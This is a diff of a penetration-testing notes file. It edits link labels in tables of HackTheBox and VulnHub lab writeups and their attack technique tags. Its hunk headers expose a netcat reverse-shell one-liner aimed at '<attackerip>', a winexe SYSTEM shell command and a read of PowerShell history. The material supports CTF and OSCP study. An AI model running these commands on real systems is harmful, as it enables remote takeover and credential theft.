@@ -329,7 +329,7 @@ type C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
   
 | # | Name | Infra | Killchain | TTPs |
 |---|------|-------|-----------|------|
-| 1. | [Archetype](https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf) | [](https://www.hackthebox.eu/home/start) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.archetype/killchain.png" width="100" height="100" /> | [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`enumerate_proto_sql`](https://github.com/7h3rAm/writeups#enumerate_proto_sql), [`enumerate_proto_sql_ssis_dtsconfig`](https://github.com/7h3rAm/writeups#enumerate_proto_sql_ssis_dtsconfig), [`exploit_sql_login`](https://github.com/7h3rAm/writeups#exploit_sql_login), [`exploit_sql_xpcmdshell`](https://github.com/7h3rAm/writeups#exploit_sql_xpcmdshell), [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`privesc_psexec_login`](https://github.com/7h3rAm/writeups#privesc_psexec_login) |
+| 1. | [Archetype](https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf) | [hackthebox#archetype](https://www.hackthebox.eu/home/start) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.archetype/killchain.png" width="100" height="100" /> | [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`enumerate_proto_sql`](https://github.com/7h3rAm/writeups#enumerate_proto_sql), [`enumerate_proto_sql_ssis_dtsconfig`](https://github.com/7h3rAm/writeups#enumerate_proto_sql_ssis_dtsconfig), [`exploit_sql_login`](https://github.com/7h3rAm/writeups#exploit_sql_login), [`exploit_sql_xpcmdshell`](https://github.com/7h3rAm/writeups#exploit_sql_xpcmdshell), [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`privesc_psexec_login`](https://github.com/7h3rAm/writeups#privesc_psexec_login) |
   
   
 ---
@@ -456,11 +456,11 @@ extract hashes from wp mysql db and crack via john:
   
 | # | Name | Infra | Killchain | TTPs |
 |---|------|-------|-----------|------|
-| 1. | [Blocky](https://github.com/7h3rAm/writeups/blob/master/htb.blocky/writeup.pdf) | [](https://www.hackthebox.eu/home/machines/profile/48) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.blocky/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
-| 2. | [LazySysAdmin: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf) | [](https://www.vulnhub.com/entry/lazysysadmin-1,205/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_smb_nullsession`](https://github.com/7h3rAm/writeups#exploit_smb_nullsession), [`exploit_smb_web_root`](https://github.com/7h3rAm/writeups#exploit_smb_web_root), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) |
-| 3. | [hackfest2016: Quaoar](https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/writeup.pdf) | [](https://www.vulnhub.com/entry/hackfest2016-quaoar,180/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_wordpress_defaultcreds), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_credsreuse`](https://github.com/7h3rAm/writeups#privesc_credsreuse) |
-| 4. | [DC: 6](https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/writeup.pdf) | [](https://www.vulnhub.com/entry/dc-6,315/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_activitymonitor`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_activitymonitor), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap) |
-| 5. | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) | [](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
+| 1. | [Blocky](https://github.com/7h3rAm/writeups/blob/master/htb.blocky/writeup.pdf) | [hackthebox#48](https://www.hackthebox.eu/home/machines/profile/48) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.blocky/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
+| 2. | [LazySysAdmin: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf) | [vulnhub#205](https://www.vulnhub.com/entry/lazysysadmin-1,205/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_smb_nullsession`](https://github.com/7h3rAm/writeups#exploit_smb_nullsession), [`exploit_smb_web_root`](https://github.com/7h3rAm/writeups#exploit_smb_web_root), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) |
+| 3. | [hackfest2016: Quaoar](https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/writeup.pdf) | [vulnhub#180](https://www.vulnhub.com/entry/hackfest2016-quaoar,180/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_wordpress_defaultcreds), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_credsreuse`](https://github.com/7h3rAm/writeups#privesc_credsreuse) |
+| 4. | [DC: 6](https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/writeup.pdf) | [vulnhub#315](https://www.vulnhub.com/entry/dc-6,315/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_activitymonitor`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_activitymonitor), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap) |
+| 5. | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) | [vulnhub#231](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
   
   
 ---
@@ -560,7 +560,7 @@ misc:
   
 | # | Name | Infra | Killchain | TTPs |
 |---|------|-------|-----------|------|
-| 1. | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) | [](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
+| 1. | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) | [vulnhub#231](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
   
 [+] https://medium.com/@ranakhalil101/my-oscp-journey-a-review-fa779b4339d9  
   
@@ -593,9 +593,9 @@ whatweb <targetip>:<targetport> --color=never --log-brief="[OUTPUT].txt" ## iden
   
 | # | Name | Infra | Killchain | TTPs |
 |---|------|-------|-----------|------|
-| 1. | [InfoSec Prep: OSCP](https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf) | [](https://www.vulnhub.com/entry/infosec-prep-oscp,508/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/killchain.png" width="100" height="100" /> | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_ssh_privatekeys`](https://github.com/7h3rAm/writeups#exploit_ssh_privatekeys), [`privesc_lxc_bash`](https://github.com/7h3rAm/writeups#privesc_lxc_bash) |
-| 2. | [Bashed](https://github.com/7h3rAm/writeups/blob/master/htb.bashed/writeup.pdf) | [](https://www.hackthebox.eu/home/machines/profile/118) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.bashed/killchain.png" width="100" height="100" /> | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_cron_rootjobs`](https://github.com/7h3rAm/writeups#privesc_cron_rootjobs) |
-| 3. | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) | [](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
+| 1. | [InfoSec Prep: OSCP](https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf) | [vulnhub#508](https://www.vulnhub.com/entry/infosec-prep-oscp,508/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/killchain.png" width="100" height="100" /> | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_ssh_privatekeys`](https://github.com/7h3rAm/writeups#exploit_ssh_privatekeys), [`privesc_lxc_bash`](https://github.com/7h3rAm/writeups#privesc_lxc_bash) |
+| 2. | [Bashed](https://github.com/7h3rAm/writeups/blob/master/htb.bashed/writeup.pdf) | [hackthebox#118](https://www.hackthebox.eu/home/machines/profile/118) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.bashed/killchain.png" width="100" height="100" /> | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_cron_rootjobs`](https://github.com/7h3rAm/writeups#privesc_cron_rootjobs) |
+| 3. | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) | [vulnhub#231](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
   
   
 ---
@@ -736,7 +736,7 @@ winexe -U username //<targetip> "cmd.exe" --system
   
 | # | Name | Infra | Killchain | TTPs |
 |---|------|-------|-----------|------|
-| 1. | [Archetype](https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf) | [](https://www.hackthebox.eu/home/start) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.archetype/killchain.png" width="100" height="100" /> | [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`enumerate_proto_sql`](https://github.com/7h3rAm/writeups#enumerate_proto_sql), [`enumerate_proto_sql_ssis_dtsconfig`](https://github.com/7h3rAm/writeups#enumerate_proto_sql_ssis_dtsconfig), [`exploit_sql_login`](https://github.com/7h3rAm/writeups#exploit_sql_login), [`exploit_sql_xpcmdshell`](https://github.com/7h3rAm/writeups#exploit_sql_xpcmdshell), [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`privesc_psexec_login`](https://github.com/7h3rAm/writeups#privesc_psexec_login) |
+| 1. | [Archetype](https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf) | [hackthebox#archetype](https://www.hackthebox.eu/home/start) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.archetype/killchain.png" width="100" height="100" /> | [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`enumerate_proto_sql`](https://github.com/7h3rAm/writeups#enumerate_proto_sql), [`enumerate_proto_sql_ssis_dtsconfig`](https://github.com/7h3rAm/writeups#enumerate_proto_sql_ssis_dtsconfig), [`exploit_sql_login`](https://github.com/7h3rAm/writeups#exploit_sql_login), [`exploit_sql_xpcmdshell`](https://github.com/7h3rAm/writeups#exploit_sql_xpcmdshell), [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`privesc_psexec_login`](https://github.com/7h3rAm/writeups#privesc_psexec_login) |
   
   
 ---
@@ -756,7 +756,7 @@ open shares, anonymous logins
   
 | # | Name | Infra | Killchain | TTPs |
 |---|------|-------|-----------|------|
-| 1. | [Archetype](https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf) | [](https://www.hackthebox.eu/home/start) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.archetype/killchain.png" width="100" height="100" /> | [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`enumerate_proto_sql`](https://github.com/7h3rAm/writeups#enumerate_proto_sql), [`enumerate_proto_sql_ssis_dtsconfig`](https://github.com/7h3rAm/writeups#enumerate_proto_sql_ssis_dtsconfig), [`exploit_sql_login`](https://github.com/7h3rAm/writeups#exploit_sql_login), [`exploit_sql_xpcmdshell`](https://github.com/7h3rAm/writeups#exploit_sql_xpcmdshell), [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`privesc_psexec_login`](https://github.com/7h3rAm/writeups#privesc_psexec_login) |
+| 1. | [Archetype](https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf) | [hackthebox#archetype](https://www.hackthebox.eu/home/start) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.archetype/killchain.png" width="100" height="100" /> | [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`enumerate_proto_sql`](https://github.com/7h3rAm/writeups#enumerate_proto_sql), [`enumerate_proto_sql_ssis_dtsconfig`](https://github.com/7h3rAm/writeups#enumerate_proto_sql_ssis_dtsconfig), [`exploit_sql_login`](https://github.com/7h3rAm/writeups#exploit_sql_login), [`exploit_sql_xpcmdshell`](https://github.com/7h3rAm/writeups#exploit_sql_xpcmdshell), [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`privesc_psexec_login`](https://github.com/7h3rAm/writeups#privesc_psexec_login) |
   
   
 ---
@@ -815,7 +815,7 @@ locate all sql scripts on kali and run them to gather details:
   
 | # | Name | Infra | Killchain | TTPs |
 |---|------|-------|-----------|------|
-| 1. | [Archetype](https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf) | [](https://www.hackthebox.eu/home/start) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.archetype/killchain.png" width="100" height="100" /> | [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`enumerate_proto_sql`](https://github.com/7h3rAm/writeups#enumerate_proto_sql), [`enumerate_proto_sql_ssis_dtsconfig`](https://github.com/7h3rAm/writeups#enumerate_proto_sql_ssis_dtsconfig), [`exploit_sql_login`](https://github.com/7h3rAm/writeups#exploit_sql_login), [`exploit_sql_xpcmdshell`](https://github.com/7h3rAm/writeups#exploit_sql_xpcmdshell), [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`privesc_psexec_login`](https://github.com/7h3rAm/writeups#privesc_psexec_login) |
+| 1. | [Archetype](https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf) | [hackthebox#archetype](https://www.hackthebox.eu/home/start) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.archetype/killchain.png" width="100" height="100" /> | [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`enumerate_proto_sql`](https://github.com/7h3rAm/writeups#enumerate_proto_sql), [`enumerate_proto_sql_ssis_dtsconfig`](https://github.com/7h3rAm/writeups#enumerate_proto_sql_ssis_dtsconfig), [`exploit_sql_login`](https://github.com/7h3rAm/writeups#exploit_sql_login), [`exploit_sql_xpcmdshell`](https://github.com/7h3rAm/writeups#exploit_sql_xpcmdshell), [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`privesc_psexec_login`](https://github.com/7h3rAm/writeups#privesc_psexec_login) |
   
   
 ---
@@ -829,7 +829,7 @@ cat *.dtsConfig
   
 | # | Name | Infra | Killchain | TTPs |
 |---|------|-------|-----------|------|
-| 1. | [Archetype](https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf) | [](https://www.hackthebox.eu/home/start) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.archetype/killchain.png" width="100" height="100" /> | [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`enumerate_proto_sql`](https://github.com/7h3rAm/writeups#enumerate_proto_sql), [`enumerate_proto_sql_ssis_dtsconfig`](https://github.com/7h3rAm/writeups#enumerate_proto_sql_ssis_dtsconfig), [`exploit_sql_login`](https://github.com/7h3rAm/writeups#exploit_sql_login), [`exploit_sql_xpcmdshell`](https://github.com/7h3rAm/writeups#exploit_sql_xpcmdshell), [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`privesc_psexec_login`](https://github.com/7h3rAm/writeups#privesc_psexec_login) |
+| 1. | [Archetype](https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf) | [hackthebox#archetype](https://www.hackthebox.eu/home/start) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.archetype/killchain.png" width="100" height="100" /> | [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`enumerate_proto_sql`](https://github.com/7h3rAm/writeups#enumerate_proto_sql), [`enumerate_proto_sql_ssis_dtsconfig`](https://github.com/7h3rAm/writeups#enumerate_proto_sql_ssis_dtsconfig), [`exploit_sql_login`](https://github.com/7h3rAm/writeups#exploit_sql_login), [`exploit_sql_xpcmdshell`](https://github.com/7h3rAm/writeups#exploit_sql_xpcmdshell), [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`privesc_psexec_login`](https://github.com/7h3rAm/writeups#privesc_psexec_login) |
   
   
 ---
@@ -852,7 +852,7 @@ ssh enum:
   
 | # | Name | Infra | Killchain | TTPs |
 |---|------|-------|-----------|------|
-| 1. | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) | [](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
+| 1. | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) | [vulnhub#231](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
   
   
 ---
@@ -928,9 +928,9 @@ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attackerip> <attack
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
